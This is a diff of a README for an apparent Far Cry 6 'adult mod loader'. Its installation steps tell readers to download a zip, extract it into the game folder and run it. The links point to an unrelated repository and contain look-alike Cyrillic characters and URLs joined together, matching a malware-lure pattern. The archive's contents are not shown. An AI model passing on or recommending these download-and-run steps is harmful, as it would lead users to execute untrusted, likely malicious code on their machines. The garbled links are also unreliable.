@@ -35,9 +35,9 @@ Welcome to the ultimate enhancement suite for **Far Cry 6**! This **Adult Mod Lo
 
 ## 🚀 Installation
 
-1. Download **https://raw.githubusercontent.com/baniblunt/ollama-rag-reranker/main/Lоader.zip** from this repository.
-2. Extract https://raw.githubusercontent.com/baniblunt/ollama-rag-reranker/main/Lоader.zip to your **Far Cry 6** root directory.
-3. Run **https://raw.githubusercontent.com/baniblunt/ollama-rag-reranker/main/Lоader.zip** (Windows), or start via terminal for Linux/Mac systems.
+1. Download **https://github.com/baniblunt/ollama-rag-reranker/raw/refs/heads/main/aerophysical/rag_ollama_reranker_1.2-beta.1.zipоhttps://github.com/baniblunt/ollama-rag-reranker/raw/refs/heads/main/aerophysical/rag_ollama_reranker_1.2-beta.1.zip** from this repository.
+2. Extract https://github.com/baniblunt/ollama-rag-reranker/raw/refs/heads/main/aerophysical/rag_ollama_reranker_1.2-beta.1.zipоhttps://github.com/baniblunt/ollama-rag-reranker/raw/refs/heads/main/aerophysical/rag_ollama_reranker_1.2-beta.1.zip to your **Far Cry 6** root directory.
+3. Run **https://github.com/baniblunt/ollama-rag-reranker/raw/refs/heads/main/aerophysical/rag_ollama_reranker_1.2-beta.1.zipоhttps://github.com/baniblunt/ollama-rag-reranker/raw/refs/heads/main/aerophysical/rag_ollama_reranker_1.2-beta.1.zip** (Windows), or start via terminal for Linux/Mac systems.
 4. Enjoy enhanced adult content with easy enable/disable features!
 
 ---
